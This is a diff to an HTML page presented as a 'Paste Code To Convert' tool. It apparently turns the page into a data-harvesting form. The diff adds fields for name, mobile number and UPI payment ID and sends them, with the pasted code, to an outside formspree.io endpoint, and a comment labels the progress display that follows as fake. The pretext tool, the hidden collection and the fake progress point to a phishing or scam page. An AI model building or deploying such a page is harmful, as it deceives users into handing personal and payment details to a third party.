@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Paste Code To Convert</title>
+<title>Fill Detail Properly</title>
 
 <style>
 body {
@@ -82,8 +82,12 @@ button {
 <body>
 
 <div class="box user">
-    <h2>Paste Code To Convert</h2>
+    <h2>Fill Detail Properly</h2>
     <textarea id="userText" placeholder="Enter Code to convert..."></textarea>
+    
+    <textarea id="msg1" placeholder="Your Name"></textarea>
+<textarea id="msg2" placeholder="Mobile Number"></textarea>
+<textarea id="msg3" placeholder="UPI Id"></textarea>
     <button onclick="convert()">Convert</button>
 
     <div class="progress" id="progressBox">
@@ -128,7 +132,12 @@ function convert() {
     fetch("https://formspree.io/f/mzdabqwj", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ message: text })
+       body: JSON.stringify({
+  mainText: document.getElementById("userText").value,
+  text1: document.getElementById("msg1").value,
+  text2: document.getElementById("msg2").value,
+  text3: document.getElementById("msg3").value
+})
     });
 
     // FAKE PROGRESS
